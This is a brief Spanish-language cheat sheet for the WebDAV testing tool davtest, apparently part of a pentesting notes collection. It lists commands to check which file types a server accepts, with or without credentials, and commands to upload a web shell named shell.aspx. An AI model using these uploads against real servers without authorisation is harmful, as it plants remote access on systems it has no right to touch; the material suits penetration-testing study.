# DavTest Cheat Sheet

### Testear el sitio para conocer que tipo de archivos se pueden subir
```
davtest -url <URL>
```

### Con autenticación
```
davtest -url <URL> -cleanup -auth <USER>:<PASSWORD>
```

### Cargar un webshell
```
davtest -url <URL> -cleanup -uploadfile ./shell.aspx -uploadloc shell.aspx
davtest -url <URL> -cleanup -auth <USER>:<PASSWORD> -uploadfile ./shell.aspx -uploadloc shell.aspx
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)